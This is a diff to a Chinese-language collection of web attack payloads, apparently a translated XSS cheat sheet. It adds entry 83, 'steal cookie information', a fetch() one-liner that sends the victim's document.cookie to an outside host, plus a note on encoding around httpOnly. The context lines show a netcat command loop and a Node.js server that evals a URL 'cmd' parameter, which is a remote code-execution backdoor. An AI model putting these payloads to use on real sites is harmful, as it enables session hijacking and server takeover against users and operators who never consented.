@@ -631,6 +631,11 @@ $ while :; do printf "j$ "; read c; echo $c | nc -lp 5855 >/dev/null; done
 require('http').createServer(function(req,res){res.end(1-
 eval(require('url').parse(req.url,1).query.cmd))}).listen(5855)
 ```
+**83.窃取cookie信息**
+用于从目标站点设置的受害者用户获取所有cookie。如果无法通过httpOnly安全标志。则在URL中将"+"编码为"%2B"
+```
+fetch('//brutelogic.com.br/?c='+document.cookie)
+```
 
 ## 致谢
 **英文议题作者：** <br>
